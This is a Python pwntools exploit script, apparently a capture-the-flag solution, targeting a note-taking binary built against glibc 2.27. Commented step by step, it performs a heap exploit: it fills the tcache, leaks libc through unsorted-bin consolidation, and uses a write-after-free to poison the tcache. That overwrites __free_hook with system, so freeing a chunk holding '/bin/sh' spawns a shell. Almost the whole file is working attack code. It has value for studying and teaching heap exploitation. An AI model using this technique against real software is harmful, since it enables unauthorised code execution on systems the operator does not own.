from pwn import *
elf = ELF('./notepad_patch', checksec=False)
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so', checksec=False)

# notebook function
def pick_notebook(idx):
    p.sendlineafter(b'>', b'p')
    p.sendlineafter(b'pick:', b'%d' % idx)

def add_notebook(name):
    p.sendlineafter(b'>', b'a')
    p.sendlineafter(b'name:', b'%s' % name)

def delete_notebook(idx):
    p.sendlineafter(b'>', b'd')
    p.sendlineafter(b'delete:', b'%d' % idx)


# tabs function
def add_tab(name, sz, data):
    p.sendlineafter(b'>', b'a')
    p.sendlineafter(b':', b'%s' % name)
    p.sendlineafter(b':', b'%d' % sz)
    p.sendlineafter(b':', b'%s' % data)

def view_tab(idx, sz):
    p.sendlineafter(b'>', b'v')
    p.sendlineafter(b':', b'%d' % idx)
    return p.recv_raw(sz)

def update_tab(idx, name, data, sz):
    p.sendlineafter(b'>', b'u')
    p.sendlineafter(b':', b'%d' % idx)
    p.sendlineafter(b':', b'%s' % name)
    p.sendlineafter(b':', b'%d' % sz)
    p.sendlineafter(b':', b'%s' % data)

def delete_tab(idx):
    p.sendlineafter(b'>', b'd')
    p.sendlineafter(b':', b'%d' % idx)

p = elf.process()

add_notebook(b'demo01')
pick_notebook(1)

# allocate 7 chunk to fill up the tcache list
for i in range(7):
    add_tab(b'dummy%d' % i , 0x100, b'AAAA')

add_tab(b'a', 0x100, b'a'*8)         # this chunk will be used for unsorted bin/libc leak
add_tab(b'b', 0x10, b'/bin/sh\x00')  # this chunk will prevent chunk a from consolidate when free

# fill up tcache list
for i in range(7):
    delete_tab(1)

# free chunk a, this will goto unsorted bin
# later when update the chunk d in the size below 0x100, this chunk will be consolidated
delete_tab(1) 

# add chunk d
add_tab(b'd', 0x100, b'XXXXKKKK')

# update chunk d so it will consolidate with chunk a
# chunk a now contains same libc address in fd/bk pointer
# so fd pointer will be \x00 and we get libc leak from bk pointer
update_tab(2, b'new_d', b'\x00'*8, 0x10)

libc.address = u64(view_tab(2, 0x10)[8:])
log.info(f'libc leak at 0x{libc.address:x}')
libc.address = eval(hex(libc.address)[:-3] + '000') - 0x3eb000 # libc 2.27 ubuntu 18.04
log.info(f'libc base at 0x{libc.address:x}')

# from write-after-free to tcache poisoning
# free chunk d
delete_tab(2)
# write-after-free chunk d
# overwrite next tcache list with __free_hook pointer
update_tab(2, b'poison_d', p64(libc.sym['__free_hook']), 0x10)

# add dummy allocation to tcache entries with the same size as chunk "poison_d"
add_tab(b'xxx', 0x10, b'xxxx')

# now chunk "poison_d" is located in next tcache entries
# overwrite the __free_hook address with system ...
# so when free'ing chunk "b" it will spawn "/bin/sh"
add_tab(b'xxx', 0x10, p64(libc.sym['system']))

delete_tab(1) # delete chunk b to spawn shell
p.interactive()